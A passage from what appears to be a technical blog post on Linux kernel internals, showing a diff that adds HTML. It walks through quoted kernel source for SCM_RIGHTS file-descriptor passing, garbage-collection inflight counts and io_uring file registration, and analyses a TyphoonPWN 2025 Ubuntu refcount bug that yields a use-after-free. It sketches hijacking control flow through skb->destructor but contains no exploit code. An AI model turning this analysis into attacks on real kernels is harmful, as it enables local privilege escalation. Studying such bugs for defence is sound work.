+</span></span><span style="display:flex;"><span>	err <span style="color:#f92672">=</span> <span style="color:#a6e22e">scm_send</span>(sock, msg, <span style="color:#f92672">&amp;</span>scm, false); <span style="color:#75715e">// [4]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> err;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> (sent <span style="color:#f92672">&lt;</span> len) {
+</span></span><span style="display:flex;"><span>		size <span style="color:#f92672">=</span> len <span style="color:#f92672">-</span> sent;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* Keep two messages in the pipe so it schedules better */</span>
+</span></span><span style="display:flex;"><span>		size <span style="color:#f92672">=</span> <span style="color:#66d9ef">min_t</span>(<span style="color:#66d9ef">int</span>, size, (sk<span style="color:#f92672">-&gt;</span>sk_sndbuf <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">/* Only send the fds in the first buffer */</span>
+</span></span><span style="display:flex;"><span>		err <span style="color:#f92672">=</span> <span style="color:#a6e22e">unix_scm_to_skb</span>(<span style="color:#f92672">&amp;</span>scm, skb, <span style="color:#f92672">!</span>fds_sent); <span style="color:#75715e">// [5]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">kfree_skb</span>(skb);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> out_err;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		fds_sent <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">skb_put</span>(skb, size <span style="color:#f92672">-</span> data_len);
+</span></span><span style="display:flex;"><span>		skb<span style="color:#f92672">-&gt;</span>data_len <span style="color:#f92672">=</span> data_len;
+</span></span><span style="display:flex;"><span>		skb<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>		err <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_copy_datagram_from_iter</span>(skb, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>msg<span style="color:#f92672">-&gt;</span>msg_iter, size);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">maybe_add_creds</span>(skb, sock, other);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">scm_stat_add</span>(other, skb);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">skb_queue_tail</span>(<span style="color:#f92672">&amp;</span>other<span style="color:#f92672">-&gt;</span>sk_receive_queue, skb);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">unix_state_unlock</span>(other);
+</span></span><span style="display:flex;"><span>		other<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sk_data_ready</span>(other);
+</span></span><span style="display:flex;"><span>		sent <span style="color:#f92672">+=</span> size;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (msg<span style="color:#f92672">-&gt;</span>msg_flags <span style="color:#f92672">&amp;</span> MSG_OOB) {
+</span></span><span style="display:flex;"><span>		err <span style="color:#f92672">=</span> <span style="color:#a6e22e">queue_oob</span>(sock, msg, other);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (err)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> out_err;
+</span></span><span style="display:flex;"><span>		sent<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>As we see in <strong>[4]</strong>, <code>scm_send</code> subsequently calls <code>__scm_send</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__scm_send</span>(<span style="color:#66d9ef">struct</span> socket <span style="color:#f92672">*</span>sock, <span style="color:#66d9ef">struct</span> msghdr <span style="color:#f92672">*</span>msg, <span style="color:#66d9ef">struct</span> scm_cookie <span style="color:#f92672">*</span>p)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> err;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">for_each_cmsghdr</span>(cmsg, msg) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">switch</span> (cmsg<span style="color:#f92672">-&gt;</span>cmsg_type)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> SCM_RIGHTS: <span style="color:#75715e">// [5]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>sock<span style="color:#f92672">-&gt;</span>ops <span style="color:#f92672">||</span> sock<span style="color:#f92672">-&gt;</span>ops<span style="color:#f92672">-&gt;</span>family <span style="color:#f92672">!=</span> PF_UNIX)
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> error;
+</span></span><span style="display:flex;"><span>			err<span style="color:#f92672">=</span><span style="color:#a6e22e">scm_fp_copy</span>(cmsg, <span style="color:#f92672">&amp;</span>p<span style="color:#f92672">-&gt;</span>fp);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (err<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> error;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">case</span> SCM_CREDENTIALS:
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span></code></pre></div><p>In [5], with the cmsg type <code>SCM_RIGHTS</code>, <strong><code>scm_fp_copy</code></strong> copies all the passed fds into <code>struct scm_fp_list* p-&gt;fp</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">scm_fp_copy</span>(<span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg, <span style="color:#66d9ef">struct</span> scm_fp_list <span style="color:#f92672">**</span>fplp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>fdp <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CMSG_DATA</span>(cmsg);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> scm_fp_list <span style="color:#f92672">*</span>fpl <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>fplp;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">**</span>fpp;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i, num;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fpl)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		fpl <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> scm_fp_list), GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fpl)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>fplp <span style="color:#f92672">=</span> fpl;
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>max <span style="color:#f92672">=</span> SCM_MAX_FD;
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>user <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	fpp <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>fpl<span style="color:#f92672">-&gt;</span>fp[fpl<span style="color:#f92672">-&gt;</span>count];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (fpl<span style="color:#f92672">-&gt;</span>count <span style="color:#f92672">+</span> num <span style="color:#f92672">&gt;</span> fpl<span style="color:#f92672">-&gt;</span>max)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 *	Verify the descriptors and increment the usage count.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> num; i<span style="color:#f92672">++</span>) <span style="color:#75715e">// FOR EACH PASSED FD
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> fdp[i];
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fget_raw</span>(fd))) 	<span style="color:#75715e">// Get its structure file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBADF;
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>fpp<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> file;	<span style="color:#75715e">//  store it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		fpl<span style="color:#f92672">-&gt;</span>count<span style="color:#f92672">++</span>;   <span style="color:#75715e">//  increase its count
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fpl<span style="color:#f92672">-&gt;</span>user)
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>user <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uid</span>(<span style="color:#a6e22e">current_user</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> num;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And later in [5], <code>unix_scm_to_skb</code> -&gt; <code>unix_attach_fds</code> the sent fds get their <strong>inflight</strong>(remember <strong>[3]</strong> in <code>unix_sock</code>!!!) increment by 1 for each:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">unix_attach_fds</span>(<span style="color:#66d9ef">struct</span> scm_cookie <span style="color:#f92672">*</span>scm, <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * Need to duplicate file references for the sake of garbage
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * collection.  Otherwise a socket in the fps might become a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * candidate for GC while the skb is not yet queued.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">UNIXCB</span>(skb).fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">scm_fp_dup</span>(scm<span style="color:#f92672">-&gt;</span>fp); <span style="color:#75715e">// [6]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">UNIXCB</span>(skb).fp)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> scm<span style="color:#f92672">-&gt;</span>fp<span style="color:#f92672">-&gt;</span>count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; i<span style="color:#f92672">--</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">unix_inflight</span>(scm<span style="color:#f92672">-&gt;</span>fp<span style="color:#f92672">-&gt;</span>user, scm<span style="color:#f92672">-&gt;</span>fp<span style="color:#f92672">-&gt;</span>fp[i]); <span style="color:#75715e">// [6]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>The reason for these increments is this: <br>
+consider a scenario where socket A sends fds into socket B; but before B receives them, the process of A closes these passed fds -&gt; <strong>UAF</strong>. <br>
+because initially, all files have 1 as <code>f_count</code> and closing them would decrease them to zero, hence, freeing them.</p>
+<p>This function does:</p>
+<ul>
+<li><strong>[5]</strong>: Increase each attached file&rsquo;s <strong>f_count</strong> using <code>file_get(...)</code> and store the duplicated list in <code>UNIXCB(skb).fp</code></li>
+<li><strong>[6]</strong>: for each file: 1) add it&rsquo;s <code>unix_sock</code> into the <code>gc_inflight_list</code> later for the GC.
+2) Increment the <code>unix_tot_inflight</code> global variable (Used to trigger GC if &gt; UNIX_INFLIGHT_TRIGGER_GC == 16000).
+3) Increment user&rsquo;s <code>unix_inflight</code>.</li>
+</ul>
+<p>Now, if your wonder how the hell the receiving process retrieves these passed fds, just see in <code>unix_stream_sendmsg</code> that it grabs its peer(receiving socket) with: <br>
+<code>other = unix_peer(sk);</code> and then attaches the filled <code>sbk</code> into it with: <br>
+<code>skb_queue_tail(&amp;other-&gt;sk_receive_queue, skb);</code></p>
+<p>The receiving process is kinda the same. Again, i strongly recommand this google project zero <a href="https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html">article</a>.</p>
+<p><img src="/Qdiv7/images/gc_io/afr0mb.jpg" alt="source: mine"></p>
+<h2 id="case-study">Case study:</h2>
+<p>We&rsquo;ll discuss a bug disclosed by @ky1ebot in TyphoonPWN 2025 Linux category, specifically <strong>Ubuntu 24.04.2</strong> with the kernel <strong>6.8.0-60-generic</strong>. <br>
+The bug is refcount mismanagment in function <code>sendmsg</code> -&gt; <code>unix_stream_sendmsg</code> -&gt; <code>queue_oob</code>, so in another words when sending file descriptors with <code>SCM_RIGHTS</code> + the <code>MSG_OOB</code> flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (msg<span style="color:#f92672">-&gt;</span>msg_flags <span style="color:#f92672">&amp;</span> MSG_OOB) {
+</span></span><span style="display:flex;"><span>		err <span style="color:#f92672">=</span> <span style="color:#a6e22e">queue_oob</span>(sock, msg, other);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">queue_oob</span>(<span style="color:#66d9ef">struct</span> socket <span style="color:#f92672">*</span>sock, <span style="color:#66d9ef">struct</span> msghdr <span style="color:#f92672">*</span>msg, <span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>other)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> unix_sock <span style="color:#f92672">*</span>ousk <span style="color:#f92672">=</span> <span style="color:#a6e22e">unix_sk</span>(other);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> err <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	skb <span style="color:#f92672">=</span> <span style="color:#a6e22e">sock_alloc_send_skb</span>(sock<span style="color:#f92672">-&gt;</span>sk, <span style="color:#ae81ff">1</span>, msg<span style="color:#f92672">-&gt;</span>msg_flags <span style="color:#f92672">&amp;</span> MSG_DONTWAIT, <span style="color:#f92672">&amp;</span>err);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">maybe_add_creds</span>(skb, sock, other);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_get</span>(skb); <span style="color:#f92672">&lt;---------------------------</span> THIS WAS REMOVED
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">WRITE_ONCE</span>(ousk<span style="color:#f92672">-&gt;</span>oob_skb, skb); <span style="color:#75715e">// [7]: Ref 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scm_stat_add</span>(other, skb);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_queue_tail</span>(<span style="color:#f92672">&amp;</span>other<span style="color:#f92672">-&gt;</span>sk_receive_queue, skb); <span style="color:#75715e">// [8]: Ref 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">sk_send_sigurg</span>(other);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">unix_state_unlock</span>(other);
+</span></span><span style="display:flex;"><span>	other<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sk_data_ready</span>(other);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> err;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span></code></pre></div><p>So basically, Ubuntu removed <code>skb_get(skb);</code> despite having 2 refenreces to <code>sbk</code> :</p>
+<ol>
+<li>the receiving socket&rsquo;s <code>oob_skb</code> and</li>
+<li>Receiving socket&rsquo;s <code>sk_receive_queue</code>. <br>
+When the sockets are closed, one refcount is decreased by the <code>unix_gc</code> and then another by <code>unix_release_sock</code>; which means that <code>unix_release_sock</code> is called on a already freed object since it&rsquo;s refcount is down to <strong>0</strong>, thus giving an attacker a powerful primitive: the <strong>Use-After-Free</strong>.</li>
+</ol>
+<p>Since the use happens in <code>unix_release_sock</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (u<span style="color:#f92672">-&gt;</span>oob_skb) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">kfree_skb</span>(u<span style="color:#f92672">-&gt;</span>oob_skb); <span style="color:#f92672">&lt;-------</span>
+</span></span><span style="display:flex;"><span>		u<span style="color:#f92672">-&gt;</span>oob_skb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>Down the line we get to :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">skb_release_head_state</span>(<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_dst_drop</span>(skb);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (skb<span style="color:#f92672">-&gt;</span>destructor) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_NET_WARN_ON_ONCE</span>(<span style="color:#a6e22e">in_hardirq</span>());
+</span></span><span style="display:flex;"><span>		skb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">destructor</span>(skb); <span style="color:#75715e">// &lt;---
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span></code></pre></div><p>Therefore, if we manage do the first free, and then reclaim the <code>skb</code>&rsquo;s with an object we can control(cross-cache attack or maybe pageJacking), <code>skb-&gt;destructor(skb);</code> can be used to hijack control flow. More on that in <a href="https://ssd-disclosure.com/lpe-via-refcount-imbalance-in-the-af_unix-of-ubuntus-kernel/">this article</a>.</p>
+<h2 id="registering-a-files-description-in-io_uring">Registering a files description in io_uring:</h2>
+<p>The <code>io_uring_register</code> system call, when used with the <strong>IORING_REGISTER_FILES</strong> opcode, registers a file descriptor within io_uring context. This allows the underlying file object to be referenced and placed in an internal array and then can be used in an IO operation by specifying the index at which it was registered, utilizing the <code>io_uring_get_sqe</code> system call.</p>
+<p><img src="/Qdiv7/images/gc_io/iouring2.png" alt="source: chompie.ie"></p>
+<p>In the kernel, the handler for <code>io_uring_register</code> is in <strong>io_uring/register.c</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__io_uring_register</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">unsigned</span> opcode,
+</span></span><span style="display:flex;"><span>			       <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>arg, <span style="color:#66d9ef">unsigned</span> nr_args)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> IORING_REGISTER_FILES:
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>arg)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_sqe_files_register</span>(ctx, arg, nr_args, NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This snippet handles <strong>IORING_REGISTER_FILES</strong> opcode, which as mentionned is used to register files in the io_uring context.</p>
+<p>In <code>io_uring/rsrc.c</code>, <code>io_sqe_files_register</code> is defined as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">io_sqe_files_register</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>arg,
+</span></span><span style="display:flex;"><span>			  <span style="color:#66d9ef">unsigned</span> nr_args, u64 __user <span style="color:#f92672">*</span>tags)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	__s32 __user <span style="color:#f92672">*</span>fds <span style="color:#f92672">=</span> (__s32 __user <span style="color:#f92672">*</span>) arg;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd, ret;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ctx<span style="color:#f92672">-&gt;</span>file_table.data.nr)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBUSY;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>nr_args)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nr_args <span style="color:#f92672">&gt;</span> IORING_MAX_FIXED_FILES)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EMFILE;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nr_args <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">rlimit</span>(RLIMIT_NOFILE))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EMFILE;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">io_alloc_file_tables</span>(ctx, <span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>file_table, nr_args)) <span style="color:#75715e">// [1]: Allocate `nr_args` elements into file_table-&gt;data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> nr_args; i<span style="color:#f92672">++</span>) { <span style="color:#75715e">// [2] : iterates through the fds i.e: the nodes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">struct</span> io_rsrc_node <span style="color:#f92672">*</span>node;
+</span></span><span style="display:flex;"><span>		u64 tag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EFAULT;
